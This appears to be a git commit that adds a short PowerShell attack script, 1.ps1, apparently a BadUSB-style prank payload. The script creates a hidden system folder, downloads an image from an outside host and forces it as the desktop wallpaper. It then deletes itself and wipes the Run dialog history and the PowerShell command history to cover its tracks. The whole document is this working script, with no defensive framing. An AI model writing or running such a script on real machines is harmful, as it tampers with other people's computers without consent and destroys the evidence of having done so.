38b21ef124482482ff7e78a6ac9b3827ff85c502
Noshbit <93923548+Noshbit@users.noreply.github.com>
2021-11-08 21:12:55 +0100

    Create 1.ps1

---
+++ 1.ps1
@@ -0,0 +1,3 @@
+md "$env:USERPROFILE\temp"; attrib +s +h "$env:USERPROFILE\temp"; iwr "jay-delic.com/a.jpg" -outfile "$env:USERPROFILE\temp\a.jpg"; sp 'HKCU:Control Panel\Desktop' Wallpaper "$env:USERPROFILE\temp\a.jpg"; 1..59 | % {RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters -windowstyle hidden; $i; $i++};
+rm "$env:userprofile\temp\1.ps1";
+Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue; $pshist = Get-PSReadlineOption | select -expand historysavepath; rm $pshist;
